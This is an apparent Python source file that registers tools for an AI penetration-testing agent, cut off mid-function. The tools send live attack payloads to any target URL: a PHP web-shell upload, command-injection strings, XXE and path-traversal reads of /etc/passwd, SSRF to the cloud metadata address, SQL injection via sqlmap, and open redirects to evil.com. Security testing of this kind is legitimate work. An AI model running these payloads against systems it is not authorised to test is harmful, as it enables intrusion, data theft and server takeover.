import asyncio
import json
import re
import shutil
import time
from pathlib import Path

from mcp.types import Tool

from .register_all import register
from .recon import _run_subprocess, _save_artifact, _record_execution


async def _persist(project_id, tool_name: str, args: dict, stdout: str, stderr: str, exit_code: int):
    if project_id:
        out_p, err_p, sha = await _save_artifact(int(project_id), tool_name, stdout, stderr)
        await _record_execution(int(project_id), tool_name, args, out_p, err_p, exit_code, sha)


# ---------------------------------------------------------------------------
# http_probe  (curl -L with headers → status/title/server)
# ---------------------------------------------------------------------------

async def _http_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = [
        "curl", "-sL", "-m", "15",
        "-D", "-",
        "--user-agent", "Mozilla/5.0 (X11; Linux x86_64) pentesting-agent/1.0",
        target,
    ]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "http_probe", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    lines = []
    status_m = re.search(r"HTTP/[\d.]+ (\d+ .+)", stdout)
    if status_m:
        lines.append(f"Status: {status_m.group(1)}")
    server_m = re.search(r"(?i)^server:\s*(.+)", stdout, re.MULTILINE)
    if server_m:
        lines.append(f"Server: {server_m.group(1).strip()}")
    title_m = re.search(r"<title[^>]*>([^<]{1,200})</title>", stdout, re.IGNORECASE)
    if title_m:
        lines.append(f"Title: {title_m.group(1).strip()}")
    ct_m = re.search(r"(?i)^content-type:\s*(.+)", stdout, re.MULTILINE)
    if ct_m:
        lines.append(f"Content-Type: {ct_m.group(1).strip()}")
    lines.append(f"\n--- raw response (truncated) ---\n{stdout[:3000]}")
    return "\n".join(lines)


register(
    Tool(
        name="http_probe",
        description="HTTP probe using curl: returns status code, server header, page title, and content-type.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _http_probe,
)


# ---------------------------------------------------------------------------
# tech_detect  (whatweb)
# ---------------------------------------------------------------------------

async def _tech_detect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("whatweb"):
        return "Error: whatweb not found in PATH. Install: apt install whatweb"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    cmd = ["whatweb", "--log-brief=-", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "tech_detect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No technology data for {target}."


register(
    Tool(
        name="tech_detect",
        description="Identify web technologies using whatweb.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _tech_detect,
)


# ---------------------------------------------------------------------------
# ssl_check  (sslscan)
# ---------------------------------------------------------------------------

async def _ssl_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required (host or host:port)."
    if not shutil.which("sslscan"):
        return "Error: sslscan not found in PATH. Install: apt install sslscan"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    cmd = ["sslscan", "--no-colour", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "ssl_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No SSL data for {target}."


register(
    Tool(
        name="ssl_check",
        description="SSL/TLS analysis using sslscan: protocols, ciphers, certificate details.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Host or host:port, e.g. 'example.com:443'"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _ssl_check,
)


# ---------------------------------------------------------------------------
# security_headers  (curl HEAD → parse security headers)
# ---------------------------------------------------------------------------

async def _security_headers(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = ["curl", "-sI", "-m", "15", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "security_headers", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    security_hdrs = [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Cross-Origin-Opener-Policy",
        "Cross-Origin-Resource-Policy",
    ]
    findings = []
    present = []
    for hdr in security_hdrs:
        m = re.search(rf"(?i)^{re.escape(hdr)}:\s*(.+)", stdout, re.MULTILINE)
        if m:
            present.append(f"  [PRESENT] {hdr}: {m.group(1).strip()}")
        else:
            findings.append(f"  [MISSING] {hdr}")
    lines = [f"Security headers for {target}:"]
    lines += present
    lines += findings
    return "\n".join(lines)


register(
    Tool(
        name="security_headers",
        description="Check HTTP security headers (HSTS, CSP, X-Frame-Options, etc.) via curl.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _security_headers,
)


# ---------------------------------------------------------------------------
# cors_check  (test CORS with Origin header)
# ---------------------------------------------------------------------------

async def _cors_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    origin = (args.get("origin") or "https://evil.com").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = ["curl", "-sI", "-m", "15", "-H", f"Origin: {origin}", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "cors_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    acao = re.search(r"(?i)^Access-Control-Allow-Origin:\s*(.+)", stdout, re.MULTILINE)
    acac = re.search(r"(?i)^Access-Control-Allow-Credentials:\s*(.+)", stdout, re.MULTILINE)
    lines = [f"CORS check for {target} (Origin: {origin}):"]
    if acao:
        val = acao.group(1).strip()
        lines.append(f"  Access-Control-Allow-Origin: {val}")
        if val == origin or val == "*":
            lines.append("  [POTENTIAL ISSUE] Origin reflected or wildcard")
    else:
        lines.append("  Access-Control-Allow-Origin: NOT SET")
    if acac:
        lines.append(f"  Access-Control-Allow-Credentials: {acac.group(1).strip()}")
    return "\n".join(lines)


register(
    Tool(
        name="cors_check",
        description="Test CORS configuration by sending a crafted Origin header and checking the response.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "origin": {"type": "string", "description": "Origin to inject (default: https://evil.com)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _cors_check,
)


# ---------------------------------------------------------------------------
# open_redirect_check
# ---------------------------------------------------------------------------

async def _open_redirect_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com%2F",
        "https:///evil.com",
    ]
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    params = (args.get("params") or "url,redirect,next,return,returnUrl,goto,dest,destination,redir,target,link").split(",")
    results = []
    for param in params[:5]:
        for payload in payloads[:3]:
            test_url = f"{target}?{param.strip()}={payload}"
            cmd = ["curl", "-sI", "-m", "10", "--max-redirs", "0", test_url]
            stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
            loc = re.search(r"(?i)^[Ll]ocation:\s*(.+)", stdout, re.MULTILINE)
            if loc and "evil.com" in loc.group(1):
                results.append(f"  [VULN] param={param} payload={payload} → {loc.group(1).strip()}")
    await _persist(project_id, "open_redirect_check", args, "\n".join(results), "", 0)
    if not results:
        return f"No open redirects found on {target} (tested {len(params[:5])} params)."
    return f"Open redirect findings for {target}:\n" + "\n".join(results)


register(
    Tool(
        name="open_redirect_check",
        description="Test common redirect parameters for open redirect vulnerabilities.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL (without params)"},
                "params": {"type": "string", "description": "Comma-separated param names to test (default: common redirect params)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _open_redirect_check,
)


# ---------------------------------------------------------------------------
# xss_reflect  (dalfox URL scan)
# ---------------------------------------------------------------------------

async def _xss_reflect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("dalfox"):
        return "Error: dalfox not found in PATH."
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))
    cmd = ["dalfox", "url", target, "--silence", "--format", "json"]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "xss_reflect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    try:
        data = json.loads(stdout) if stdout.strip() else []
        if isinstance(data, dict):
            data = [data]
        if not data:
            return f"dalfox: no reflected XSS found on {target}"
        lines = [f"Reflected XSS findings ({len(data)}):"]
        for item in data:
            lines.append(f"  param={item.get('param','?')} type={item.get('type','?')}")
            lines.append(f"    payload: {item.get('poc','')[:120]}")
        return "\n".join(lines)
    except json.JSONDecodeError:
        return f"dalfox output:\n{stdout[:2000]}"


register(
    Tool(
        name="xss_reflect",
        description="Reflected XSS scan using dalfox url mode.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameters"},
                "cookies": {"type": "string", "description": "Cookie header for authenticated scans"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 120)"},
            },
        },
    ),
    _xss_reflect,
)


# ---------------------------------------------------------------------------
# xss_dom  (dalfox DOM scan)
# ---------------------------------------------------------------------------

async def _xss_dom(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("dalfox"):
        return "Error: dalfox not found in PATH."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))
    cmd = ["dalfox", "url", target, "--silence", "--format", "json", "--only-poc", "da"]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "xss_dom", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or f"dalfox DOM scan complete. No DOM XSS found on {target}."


register(
    Tool(
        name="xss_dom",
        description="DOM-based XSS scan using dalfox with DOM analysis mode.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 120)"},
            },
        },
    ),
    _xss_dom,
)


# ---------------------------------------------------------------------------
# sqli_error  (sqlmap --level=1 --risk=1 error-based)
# ---------------------------------------------------------------------------

async def _sqli_error(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("sqlmap"):
        return "Error: sqlmap not found in PATH."
    data = (args.get("data") or "").strip()
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 180))
    cmd = [
        "sqlmap", "-u", target, "--batch", "--level", "1", "--risk", "1",
        "--technique", "E", "--output-dir",
        str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
    ]
    if data:
        cmd += ["--data", data]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "sqli_error", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    verdict = [ln for ln in stdout.splitlines() if any(k in ln for k in ["injectable", "Parameter:", "sqlmap identified", "[WARNING]"])]
    return f"sqlmap error-based SQLi:\n" + ("\n".join(verdict) if verdict else stdout[-2000:])


register(
    Tool(
        name="sqli_error",
        description="sqlmap error-based SQL injection (level=1, risk=1, technique=E).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter"},
                "data": {"type": "string", "description": "POST body"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 180)"},
            },
        },
    ),
    _sqli_error,
)


# ---------------------------------------------------------------------------
# sqli_blind  (sqlmap --level=3 --risk=2)
# ---------------------------------------------------------------------------

async def _sqli_blind(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("sqlmap"):
        return "Error: sqlmap not found in PATH."
    data = (args.get("data") or "").strip()
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    cmd = [
        "sqlmap", "-u", target, "--batch", "--level", "3", "--risk", "2",
        "--technique", "BT", "--output-dir",
        str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
    ]
    if data:
        cmd += ["--data", data]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "sqli_blind", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    verdict = [ln for ln in stdout.splitlines() if any(k in ln for k in ["injectable", "Parameter:", "sqlmap identified", "[WARNING]"])]
    return "sqlmap blind SQLi:\n" + ("\n".join(verdict) if verdict else stdout[-2000:])


register(
    Tool(
        name="sqli_blind",
        description="sqlmap blind SQL injection (level=3, risk=2, technique=BT boolean/time-based).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter"},
                "data": {"type": "string", "description": "POST body"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _sqli_blind,
)


# ---------------------------------------------------------------------------
# sqli_union  (sqlmap --technique=U)
# ---------------------------------------------------------------------------

async def _sqli_union(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("sqlmap"):
        return "Error: sqlmap not found in PATH."
    data = (args.get("data") or "").strip()
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 180))
    cmd = [
        "sqlmap", "-u", target, "--batch", "--technique", "U",
        "--output-dir",
        str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
    ]
    if data:
        cmd += ["--data", data]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "sqli_union", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    verdict = [ln for ln in stdout.splitlines() if any(k in ln for k in ["injectable", "Parameter:", "sqlmap identified", "[WARNING]"])]
    return "sqlmap UNION-based SQLi:\n" + ("\n".join(verdict) if verdict else stdout[-2000:])


register(
    Tool(
        name="sqli_union",
        description="sqlmap UNION-based SQL injection (technique=U).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter"},
                "data": {"type": "string", "description": "POST body"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 180)"},
            },
        },
    ),
    _sqli_union,
)


# ---------------------------------------------------------------------------
# ssrf_probe  (curl with SSRF payloads)
# ---------------------------------------------------------------------------

async def _ssrf_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "url").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",  # 127.0.0.1 as decimal
    ]
    results = []
    for payload in payloads:
        test_url = f"{target}?{param}={payload}"
        cmd = ["curl", "-sL", "-m", "8", "-w", "\\n%{http_code}", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        code_m = re.search(r"\n(\d{3})$", stdout)
        code = code_m.group(1) if code_m else "?"
        body_len = len(stdout)
        results.append(f"  {payload} → HTTP {code} body_len={body_len}")
    summary = f"SSRF probe for {target} (param={param}):\n" + "\n".join(results)
    await _persist(project_id, "ssrf_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="ssrf_probe",
        description="Test URL parameters for SSRF by injecting localhost/metadata payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL base"},
                "param": {"type": "string", "description": "Parameter name to inject (default: url)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _ssrf_probe,
)


# ---------------------------------------------------------------------------
# ssti_probe  ({{7*7}} and other SSTI payloads)
# ---------------------------------------------------------------------------

async def _ssti_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("*{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
    ]
    base_url = target if not param else target
    results = []
    for payload, expected in payloads:
        import urllib.parse
        encoded = urllib.parse.quote(payload)
        if param:
            test_url = f"{target}?{param}={encoded}"
        else:
            test_url = f"{target}{encoded}"
        cmd = ["curl", "-sL", "-m", "10", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if expected in stdout:
            results.append(f"  [VULN] payload={payload!r} → response contains '{expected}' (SSTI confirmed)")
        else:
            results.append(f"  [SAFE] payload={payload!r} → '{expected}' not in response")
    summary = f"SSTI probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "ssti_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="ssti_probe",
        description="Test for Server-Side Template Injection by injecting arithmetic payloads ({{7*7}} etc.).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "GET parameter name to inject payload into"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _ssti_probe,
)


# ---------------------------------------------------------------------------
# lfi_probe  (path traversal/LFI patterns)
# ---------------------------------------------------------------------------

async def _lfi_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "file").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 90))
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]
    results = []
    for payload in payloads:
        import urllib.parse
        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        cmd = ["curl", "-sL", "-m", "10", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if "root:" in stdout or "daemon:" in stdout:
            results.append(f"  [VULN] {payload!r} → /etc/passwd content in response!")
        elif len(stdout) > 100:
            results.append(f"  [CHECK] {payload!r} → response len={len(stdout)} (manual review)")
    if not results:
        results.append(f"  No obvious LFI detected for param={param}")
    summary = f"LFI probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "lfi_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="lfi_probe",
        description="Test for Local File Inclusion / path traversal using common payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL (without param)"},
                "param": {"type": "string", "description": "Parameter name (default: file)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 90)"},
            },
        },
    ),
    _lfi_probe,
)


# ---------------------------------------------------------------------------
# rfi_probe  (Remote File Inclusion patterns)
# ---------------------------------------------------------------------------

async def _rfi_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "file").strip()
    callback_host = (args.get("callback_host") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        "http://127.0.0.1/",
        "https://example.com/",
    ]
    if callback_host:
        payloads.insert(0, f"http://{callback_host}/rfi_test.php")
    results = []
    for payload in payloads:
        import urllib.parse
        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        cmd = ["curl", "-sL", "-m", "10", "-w", "\\nHTTP_CODE:%{http_code}", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        results.append(f"  payload={payload!r} → rc={rc} response_len={len(stdout)}")
    summary = f"RFI probe for {target} (param={param}):\n" + "\n".join(results)
    await _persist(project_id, "rfi_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="rfi_probe",
        description="Test for Remote File Inclusion by injecting external URLs into file parameters.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "Parameter name (default: file)"},
                "callback_host": {"type": "string", "description": "Your OOB callback host for RFI detection"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _rfi_probe,
)


# ---------------------------------------------------------------------------
# xxe_probe  (XXE via curl POST)
# ---------------------------------------------------------------------------

async def _xxe_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    xxe_payloads = [
        (
            "classic_file_read",
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ),
        (
            "blind_oob",
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        ),
    ]
    results = []
    for name, payload in xxe_payloads:
        cmd = [
            "curl", "-sL", "-m", "10", "-X", "POST",
            "-H", "Content-Type: application/xml",
            "-d", payload, target,
        ]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if "root:" in stdout or "daemon:" in stdout:
            results.append(f"  [VULN] {name} → /etc/passwd content in response!")
        else:
            results.append(f"  [?] {name} → response len={len(stdout)} rc={rc}")
    summary = f"XXE probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "xxe_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="xxe_probe",
        description="Test for XML External Entity injection by POSTing XXE payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL accepting XML POST"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _xxe_probe,
)


# ---------------------------------------------------------------------------
# cmdi_probe  (command injection patterns)
# ---------------------------------------------------------------------------

async def _cmdi_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    import urllib.parse
    payloads = [
        ";id",
        "|id",
        "`id`",
        "$(id)",
        ";sleep 5",
        "&&id",
        "||id",
    ]
    results = []
    for payload in payloads:
        if param:
            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        else:
            test_url = f"{target}{urllib.parse.quote(payload)}"
        start = time.time()
        cmd = ["curl", "-sL", "-m", "12", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        elapsed = time.time() - start
        if "uid=" in stdout and "gid=" in stdout:
            results.append(f"  [VULN] {payload!r} → id command output in response!")
        elif elapsed > 4.5 and "sleep" in payload:
            results.append(f"  [VULN] {payload!r} → time delay {elapsed:.1f}s (blind cmdi)")
        else:
            results.append(f"  [OK] {payload!r} → no indicator (elapsed={elapsed:.1f}s)")
    summary = f"CMDi probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "cmdi_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="cmdi_probe",
        description="Test for OS command injection using common shell metacharacter payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "GET parameter name to inject"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _cmdi_probe,
)


# ---------------------------------------------------------------------------
# path_traversal  (../../../etc/passwd patterns)
# ---------------------------------------------------------------------------

async def _path_traversal(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "path").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    import urllib.parse
    payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....//....//....//etc/passwd",
    ]
    results = []
    for payload in payloads:
        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        cmd = ["curl", "-sL", "-m", "10", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        if "root:" in stdout or "[extensions]" in stdout:
            results.append(f"  [VULN] {payload!r} → file content in response!")
        else:
            results.append(f"  [OK] {payload!r}")
    summary = f"Path traversal probe for {target} (param={param}):\n" + "\n".join(results)
    await _persist(project_id, "path_traversal", args, summary, "", 0)
    return summary


register(
    Tool(
        name="path_traversal",
        description="Test for path traversal vulnerabilities using ../../../etc/passwd patterns.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "Parameter name (default: path)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _path_traversal,
)


# ---------------------------------------------------------------------------
# file_upload_check
# ---------------------------------------------------------------------------

async def _file_upload_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target (upload endpoint URL) is required."
    field = (args.get("field") or "file").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    # Test uploads: PHP shell, PHP with different extensions, null byte
    tests = [
        ("shell.php", "application/octet-stream", "<?php system($_GET['cmd']); ?>"),
        ("shell.php.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>"),
        ("shell.pHp", "application/octet-stream", "<?php system($_GET['cmd']); ?>"),
        ("shell.php%00.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>"),
    ]
    results = []
    for filename, ct, content in tests:
        cmd = [
            "curl", "-sL", "-m", "15", "-X", "POST",
            "-F", f"{field}=@-;filename={filename};type={ct}",
            target,
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(input=content.encode()), timeout=20
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            results.append(f"  {filename} → TIMEOUT")
            continue
        resp = stdout_b.decode(errors="replace")
        results.append(f"  {filename} → rc={proc.returncode} response_len={len(resp)}")
    summary = f"File upload check for {target} (field={field}):\n" + "\n".join(results)
    await _persist(project_id, "file_upload_check", args, summary, "", 0)
    return summary


register(
    Tool(
        name="file_upload_check",
        description="Test file upload endpoint for extension bypass vulnerabilities (PHP webshell uploads).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Upload endpoint URL"},
                "field": {"type": "string", "description": "Form field name (default: file)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _file_upload_check,
)


# ---------------------------------------------------------------------------
# idor_check  (sequential ID manipulation)
# ---------------------------------------------------------------------------

async def _idor_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required (use {ID} placeholder, e.g. /api/user/{ID})."
    start_id = int(args.get("start_id", 1))
    count = min(int(args.get("count", 5)), 20)
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    results = []
    for i in range(start_id, start_id + count):
        test_url = target.replace("{ID}", str(i))
        cmd = ["curl", "-sL", "-m", "10", "-w", "\\nHTTP_CODE:%{http_code}"]
        if cookies:
            cmd += ["-H", f"Cookie: {cookies}"]
        cmd.append(test_url)
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
        code_m = re.search(r"HTTP_CODE:(\d+)$", stdout)
        code = code_m.group(1) if code_m else "?"
        body = stdout[:200].replace("\n", " ")
